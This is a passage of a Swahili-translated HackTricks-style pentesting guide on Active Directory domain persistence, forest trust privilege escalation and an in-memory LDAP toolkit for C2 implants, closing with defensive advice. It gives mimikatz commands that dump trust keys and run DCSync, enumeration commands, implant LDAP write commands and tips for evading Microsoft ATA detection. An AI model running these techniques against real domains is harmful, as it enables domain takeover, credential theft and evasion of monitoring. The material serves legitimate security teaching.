### **Certificates Domain Persistence**

**Kutumia certificates pia kunawezekana kudumu kwa vibali vya juu ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Kituo cha **AdminSDHolder** ndani ya Active Directory kinahakikisha usalama wa **vikundi vyenye vibali** (kama Domain Admins na Enterprise Admins) kwa kutumia ACL ya kawaida kwa vikundi hivi ili kuzuia mabadiliko yasiyoruhusiwa. Hata hivyo, kipengele hiki kinaweza kutumiwa vibaya; ikiwa mshambulizi atabadilisha ACL ya AdminSDHolder ili kumpa mtumiaji wa kawaida upatikanaji kamili, mtumiaji huyo atapata udhibiti mkubwa juu ya vikundi vyote vyenye vibali. Kipimo hiki cha usalama, kilichokusudiwa kuwalinda, kinaweza hivyo kuleta mfaao usioruhusiwa, isipokuwa kitazamwe kwa karibu.

[**Maelezo zaidi kuhusu AdminDSHolder Group hapa.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Ndani ya kila **Domain Controller (DC)**, kuna account ya **local administrator**. Kwa kupata haki za admin kwenye mashine hiyo, hash ya local Administrator inaweza kuchukuliwa kwa kutumia **mimikatz**. Baadaye, mabadiliko ya registry yanahitajika ili **kuruhusu matumizi ya password hii**, kuruhusu upatikanaji wa mbali kwa account ya local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Unaweza **kumtoa** baadhi ya **ruhusa maalum** kwa **mtumiaji** juu ya baadhi ya domain objects ambayo yatamruhusu mtumiaji **kuongezeka kwa vibali baadaye**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** zinatumika **kuhifadhi** **vibali** ambavyo **object** ina **juu ya** object hiyo. Ukibadilisha tu **kidogo** kwenye **security descriptor** ya object, unaweza kupata vibali vya kuvutia juu ya object hiyo bila haja ya kuwa mwanachama wa kundi lenye vibali.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** katika memory ili kuweka **password ya ulimwengu wote**, ikikupa upatikanaji kwa akaunti zote za domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Jifunze ni SSP (Security Support Provider) ni nini hapa.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kushika** kwa **clear text** **credentials** zinazotumika kufikia mashine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Inasajili **Domain Controller mpya** katika AD na kutumia ili **push attributes** (SIDHistory, SPNs...) kwa objects maalum **bila** kuacha **logs** kuhusu **mabadiliko**. Unahitaji vibali vya DA na uwe ndani ya **root domain**.\
Kumbuka kwamba ukiingiza data isiyo sahihi, logs mbaya zitajitokeza.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Hapo awali tulijadili jinsi ya kuongeza vibali ikiwa una **ruhusa za kutosha kusoma nywila za LAPS**. Hata hivyo, nywila hizi zinaweza pia kutumika kwa **kudumisha persistence**.\
Angalia:

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft inaona **Forest** kama mpaka wa usalama. Hii ina maana kwamba **kuvujishwa kwa domain moja kunaweza kusababisha kuvujishwa kwa Forest nzima**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni mekanismo ya usalama inayomruhusu mtumiaji kutoka **domain** moja kufikia rasilimali katika **domain** nyingine. Inaunda uhusiano kati ya mifumo ya uthibitishaji ya domains mbili, kuruhusu uthibitisho kuhamisha kwa urahisi. Wakati domains zinaweka trust, zinabadilisha na kuhifadhi **keys** maalum ndani ya **Domain Controllers (DCs)** zao, ambazo ni muhimu kwa uadilifu wa trust.

Katika hali ya kawaida, ikiwa mtumiaji anataka kufikia huduma katika **trusted domain**, lazima kwanza aombe tiketi maalum inayojulikana kama **inter-realm TGT** kutoka kwa DC ya domain yake. TGT hii imefichwa kwa **key** ya pamoja ambayo domains zote zimekubaliana. Mtumiaji kisha huwasilisha inter-realm TGT kwa **DC ya trusted domain** ili kupata TGS. Baada ya DC ya trusted kuthibitisha inter-realm TGT kwa kutumia key ya trust, hutoa TGS, kumruhusu mtumiaji kufikia huduma.

**Hatua**:

1. Kompyuta ya **client** katika **Domain 1** inaanza mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)**.
2. DC1 hutoa TGT mpya ikiwa client imethibitishwa kwa mafanikio.
3. Client kisha huomba **inter-realm TGT** kutoka DC1, ambayo inahitajika kufikia rasilimali katika **Domain 2**.
4. Inter-realm TGT imefichwa kwa **trust key** iliyogawanywa kati ya DC1 na DC2 kama sehemu ya domain trust ya pande mbili.
5. Client huchukua inter-realm TGT kwenda kwa **Domain 2's Domain Controller (DC2)**.
6. DC2 inathibitisha inter-realm TGT kwa kutumia trust key iliyo kwenye upande wake na, ikiwa ni halali, hutoa **Ticket Granting Service (TGS)** kwa server katika Domain 2 ambayo client anataka kufikia.
7. Mwishowe, client huwasilisha TGS hii kwa server, ambayo imefichwa kwa hash ya account ya server, kupata ufikiaji wa huduma katika Domain 2.

### Different trusts

Ni muhimu kutambua kwamba **trust inaweza kuwa ya njia 1 au njia 2**. Katika chaguo la pande mbili, domains zote mbili zitawaminiana, lakini katika uhusiano wa **moja kwa moja** mmoja wa domains atakuwa **trusted** na mwingine atakuwa **trusting** domain. Katika kesi ya mwisho, **utakuwa na uwezo wa kufikia rasilimali ndani ya trusting domain kutoka trusted domain pekee**.

Ikiwa Domain A inamwamini Domain B, A ndiyo trusting domain na B ndiye trusted. Zaidi ya hayo, katika **Domain A**, hili litakuwa **Outbound trust**; na katika **Domain B**, hili litakuwa **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Hii ni mpangilio wa kawaida ndani ya forest moja, ambapo child domain ina moja kwa moja two-way transitive trust na parent domain yake. Kwa msingi, hii ina maana kuwa maombi ya uthibitisho yanaweza kusafiri kwa urahisi kati ya parent na child.
- **Cross-link Trusts**: Inajulikana kama "shortcut trusts," hizi zinaanzishwa kati ya child domains ili kuharakisha michakato ya referral. Katika forests tata, marejeleo ya uthibitisho kawaida lazima yasafiri juu hadi forest root kisha chini hadi domain lengwa. Kwa kuunda cross-links, safari hupunguzwa, jambo lenye faida hasa katika mazingira yaliyoenea kijiografia.
- **External Trusts**: Hizi zinaanzishwa kati ya domains tofauti, zisizo na uhusiano, na ni non-transitive kwa asili. Kulingana na nyaraka za [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts ni muhimu kwa kufikia rasilimali katika domain nje ya forest ya sasa ambayo haiji na forest trust. Usalama unaboreshwa kupitia SID filtering na external trusts.
- **Tree-root Trusts**: Trusts hizi zinaanzishwa moja kwa moja kati ya forest root domain na tree root mpya iliyoongezwa. Ingawa hazipatikani mara kwa mara, tree-root trusts ni muhimu kwa kuongeza miti mpya ya domain kwenye forest, zikimruhusu kuwa na domain name tofauti na kuhakikisha two-way transitivity. Maelezo zaidi yanaweza kupatikana katika [mwongozo wa Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni two-way transitive trust kati ya forest root domains mbili, pia ikiteketeza SID filtering ili kuboresha hatua za usalama.
- **MIT Trusts**: Trusts hizi zinaanzishwa na Kerberos domains zisizo za Windows, zinazofuata [RFC4120-compliant](https://tools.ietf.org/html/rfc4120). MIT trusts ni maalum zaidi na zinahudumia mazingira yanayohitaji ujumuishaji na mifumo ya Kerberos nje ya ekosistimu ya Windows.

#### Other differences in **trusting relationships**

- Uhusiano wa trust unaweza pia kuwa **transitive** (A inaamini B, B inaamini C, basi A inaamini C) au **non-transitive**.
- Uhusiano wa trust unaweza kuwekwa kama **bidirectional trust** (pande zote zinawaamini) au kama **one-way trust** (moja tu inamwamini mwingine).

### Attack Path

1. **Enumerate** uhusiano wa trusting
2. Kagua ikiwa kuna **security principal** (user/group/computer) ana **access** kwa rasilimali za **domain nyingine**, pengine kupitia ACE entries au kwa kuwa katika groups za domain nyingine. Tafuta **mahusiano kati ya domains** (trust ilianzishwa kwa hii labda).
1. kerberoast katika kesi hii inaweza kuwa chaguo jingine.
3. **Compromise** **accounts** ambazo zinaweza **pivot** kupitia domains.

Wavamizi wanaoweza kupata rasilimali katika domain nyingine kupitia mbinu tatu kuu:

- **Local Group Membership**: Principals wanaweza kuongezwa kwenye groups za local kwenye mashine, kama “Administrators” group kwenye server, kuwapangia udhibiti mkubwa juu ya mashine hiyo.
- **Foreign Domain Group Membership**: Principals pia wanaweza kuwa wanachama wa groups ndani ya domain ya kigeni. Hata hivyo, ufanisi wa njia hii unategemea asili ya trust na upeo wa kundi.
- **Access Control Lists (ACLs)**: Principals wanaweza kutajwa katika **ACL**, hasa kama entities katika **ACEs** ndani ya **DACL**, kuwapa upatikanaji kwa rasilimali maalum. Kwa wale wanaotaka kuingia kwa undani katika mechanics za ACLs, DACLs, na ACEs, whitepaper yenye kichwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni rasilimali muhimu.

### Find external users/groups with permissions

Unaweza kuangalia **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** kupata foreign security principals katika domain. Hawa watakuwa user/group kutoka **external domain/forest**.

Unaweza kuangalia hili ndani ya **Bloodhound** au kutumia powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Njia nyingine za kuorodhesha uaminifu wa domain:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Kuna **funguo 2 za kuaminika**, moja kwa _Child --> Parent_ na nyingine kwa _Parent_ --> _Child_.\
> Unaweza kuonyesha ile inayotumika na domain ya sasa kwa kutumia:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Pandisha hadhi kuwa Enterprise admin kwenye domain ya child/parent kwa kutumia trust kupitia SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Kuelewa jinsi Configuration Naming Context (NC) inaweza kutumika kwa uharifu ni muhimu. Configuration NC inafanya kazi kama hazina kuu ya data za usanidi ndani ya msitu (forest) katika mazingira ya Active Directory (AD). Data hii huakikabidhiwa kwa kila Domain Controller (DC) ndani ya msitu, na DC zilizoandikwa kwa uandishi zinadumisha nakala inayoweza kuandikwa ya Configuration NC. Ili kutekeleza hili, lazima uwe na **SYSTEM privileges on a DC**, ikiwezekana DC ya child.

**Link GPO to root DC site**

Sites container ya Configuration NC ina taarifa kuhusu sites za kompyuta zote zilizounga mkono domain ndani ya msitu wa AD. Kwa kufanya kazi ukiwa na **SYSTEM privileges on a DC** kwenye DC yoyote, mshambuliaji anaweza ku-link GPOs kwa sites za root DC. Hatua hii inaweza kuhujumu root domain kwa kubadilisha policies zinazotumika kwa sites hizo.

Kwa maelezo ya kina, unaweza kusoma utafiti kuhusu [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Njia ya shambulio inahusisha kulenga gMSA zilizo na ruhusa za juu ndani ya domain. KDS Root key, muhimu kwa kuhesabu nywila za gMSA, imehifadhiwa ndani ya Configuration NC. Ukiwa na **SYSTEM privileges on a DC**, inawezekana kupata KDS Root key na kuhesabu nywila za gMSA yoyote ndani ya msitu mzima.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Njia hii inahitaji uvumilivu, ukisubiri uundaji wa AD objects mpya zenye ruhusa za juu. Ukiwa na **SYSTEM privileges**, mshambuliaji anaweza kubadilisha AD Schema ili kumpa mtumiaji yeyote udhibiti kamili juu ya classes zote. Hii inaweza kusababisha upatikanaji usioidhinishwa na udhibiti wa AD objects mpya zilizotengenezwa.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Udhaifu wa ADCS ESC5 unalenga kudhibiti vitu vya Public Key Infrastructure (PKI) ili kuunda template ya cheti inayoruhusu authentication kama mtumiaji yeyote ndani ya msitu. Kwa kuwa PKI objects ziko katika Configuration NC, kukwamisha writable child DC kunawezesha utekelezaji wa mashambulio ya ESC5.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Katika tukio hili **domain yako imeaminishwa** na domain ya nje ikikupa **ruhusa zisizobainishwa** juu yake. Utahitaji kutafuta **ni principals gani wa domain yako wana ufikiaji gani juu ya domain ya nje** na kisha kujaribu kuvitumia:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - Njia Moja (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Katika senario hii, **your domain** inamwamini principal kutoka **different domains** kwa kumkabidhi baadhi ya **privileges**.

Hata hivyo, wakati **a domain is trusted** na domain inayomwamini, the trusted domain **creates a user** mwenye **predictable name** ambaye anatumia kama **password the trusted password**. Hii inamaanisha inawezekana **access a user from the trusting domain to get inside the trusted one** ili kuorodhesha na kujaribu kuongeza privileges zaidi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya kuathiri the trusted domain ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyotengenezwa katika **opposite direction** ya domain trust (ambayo si ya kawaida sana).

Njia nyingine ya kuathiri the trusted domain ni kusubiri kwenye mashine ambapo **user from the trusted domain can access** kuingia kupitia **RDP**. Kisha, mshambuliaji anaweza kuingiza code kwenye mchakato wa RDP session na **access the origin domain of the victim** kutoka huko. Zaidi ya hayo, ikiwa **victim mounted his hard drive**, kutoka kwenye mchakato wa **RDP session** mshambuliaji anaweza kuhifadhi **backdoors** kwenye **startup folder of the hard drive**. Mbinu hii inaitwa **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Kupambana na matumizi mabaya ya domain trust

### **SID Filtering:**

- Hatari ya mashambulizi yanayotumia SID history attribute across forest trusts imepunguzwa kwa SID Filtering, ambayo imewashwa kwa default kwenye inter-forest trusts zote. Hii inategemea dhana kwamba intra-forest trusts ni salama, ikizingatia forest badala ya domain kama mpaka wa usalama kama msimamo wa Microsoft.
- Hata hivyo, kuna tatizo: SID filtering inaweza kuathiri applications na ufikiaji wa watumiaji, na kusababisha kuzimwa kwake mara kwa mara.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication inahakikisha kwamba watumiaji kutoka mabwi hayo mawili hawataunganishwi kiotomatiki. Badala yake, ruhusa maalum zinahitajika kwa watumiaji ili kuaccess domains na servers ndani ya trusting domain au forest.
- Ni muhimu kutambua kuwa hatua hizi hazilindi dhidi ya matumizi mabaya ya writable Configuration Naming Context (NC) au mashambulizi dhidi ya trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) inatekeleza tena bloodyAD-style LDAP primitives kama x64 Beacon Object Files zinazofanya kazi kabisa ndani ya on-host implant (mfano, Adaptix C2). Operator wanakusanya pack kwa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, wanapakia `ldap.axs`, kisha wanasema `ldap <subcommand>` kutoka kwa beacon. Trafiki yote hutumia current logon security context juu ya LDAP (389) na signing/sealing au LDAPS (636) yenye auto certificate trust, kwa hivyo hakuna socks proxies au disk artifacts zinazohitajika.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` hutatua short names/OU paths kuwa full DNs na kudump corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` huvuta arbitrary attributes (ikiwa ni pamoja na security descriptors) pamoja na forest/domain metadata kutoka `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` zinaonyesha roasting candidates, delegation settings, na existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors moja kwa moja kutoka LDAP.
- `get-acl` and `get-writable --detailed` hupanga DACL ili kuorodhesha trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), na inheritance, zikitoa malengo ya papo hapo kwa ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) zinamruhusu mendoeshaji kuweka principals mpya au machine accounts mahali popote palipo na haki za OU. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` huchukua udhibiti wa malengo moja kwa moja mara haki za write-property zinapopatikana.
- Amri zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` hubadilisha WriteDACL/WriteOwner kwenye kitu chochote cha AD kuwa resets za password, udhibiti wa uanachama wa kundi, au vibali vya DCSync replication bila kuacha artifacts za PowerShell/ADSI. Ndugu zenye prefix `remove-*` hurekebisha ACE zilizowekwa.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` hufanya user aliyenyongwa kuwa Kerberoastable mara moja; `add-asreproastable` (UAC toggle) humweka kwa ajili ya AS-REP roasting bila kugusa password.
- Makro za delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) hubadilisha `msDS-AllowedToDelegateTo`, flag za UAC, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwenye beacon, kuruhusu njia za shambulio za constrained/unconstrained/RBCD na kuondoa haja ya PowerShell ya mbali au RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` huingiza SIDs zenye vipaumbele kwenye SID history ya principal inayodhibitiwa (angalia [SID-History Injection](sid-history-injection.md)), ikitoa urithi wa upatikanaji kwa utukufu kabisa kupitia LDAP/LDAPS.
- `move-object` hubadilisha DN/OU za computers au users, kumruhusu mshambuliaji kuvuta mali ndani ya OUs ambapo haki za delegation tayari zipo kabla ya kudanganya `set-password`, `add-groupmember`, au `add-spn`.
- Amri za kuondoa zinazolengwa kwa ukandamizaji (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, nk.) zinaruhusu kurudisha mabadiliko haraka baada ya mendoeshaji kukusanya credentials au persistence, kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Baadhi ya Kinga za Jumla

[**Jifunze zaidi jinsi ya kulinda credentials hapa.**](../stealing-credentials/credentials-protections.md)

### **Hatua za Ulinzi za Kulinda Credentials**

- **Vikwazo kwa Domain Admins**: Inashauriwa kwamba Domain Admins waombwe kuingia tu kwenye Domain Controllers, kuepuka matumizi yao kwenye host nyingine.
- **Haki za Service Account**: Huduma hazipaswi kuendeshwa kwa haki za Domain Admin (DA) ili kudumisha usalama.
- **Kuingizwa kwa Muda kwa Haki za Kazi (Temporal Privilege Limitation)**: Kwa kazi zinahitaji haki za DA, muda wa haki hizo unapaswa kupunguzwa. Hii inaweza kufikiwa kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Kuzuia LDAP relay**: Kagua Event IDs 2889/3074/3075 kisha tilia nguvu LDAP signing pamoja na LDAPS channel binding kwenye DCs/clients ili kuzuia majaribio ya LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Kutekeleza Mbinu za Deception**

- Kutekeleza deception ni kujenga mitego, kama users au computers za dekoyi, zenye sifa kama passwords zisizoisha au zilizowekwa kama Trusted for Delegation. Njia kamili ni pamoja na kuunda users wenye haki maalum au kuwaongeza kwa makundi yenye vipaumbele vya juu.
- Mfano wa vitendo ni kutumia zana kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Taarifa zaidi kuhusu kutekeleza mbinu za deception inaweza kupatikana kwenye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Kutambua Deception**

- **Kwa Vitu vya User (User Objects)**: Viashiria vinavyoshuku ni pamoja na ObjectSID isiyo ya kawaida, logons za mara kwa mara zisizozoeleka, tarehe za uundaji, na idadi ndogo ya password zenye makosa.
- **Viashiria kwa Ujumla**: Kufananisha attributes za vitu vinavyoweza kuwa dekoyi na zile za vitu halisi kunaweza kufichua kutokufanana. Zana kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua deception hizo.

### **Kupita Mifumo ya Utambuzi (Bypassing Detection Systems)**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Kuepuka user/session enumeration kwenye Domain Controllers ili kuzuia utambuzi wa ATA.
- **Ticket Impersonation**: Kutumia vikoa vya **aes** kwa ajili ya uundaji wa tiketi husaidia kuepuka utambuzi kwa kutoanguka hadi NTLM.
- **DCSync Attacks**: Kutekeleza kutoka kwa host isiyo Domain Controller ili kuepuka utambuzi wa ATA kunashauriwa, kwani utekelezaji moja kwa moja kutoka Domain Controller utaanzisha onyo.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
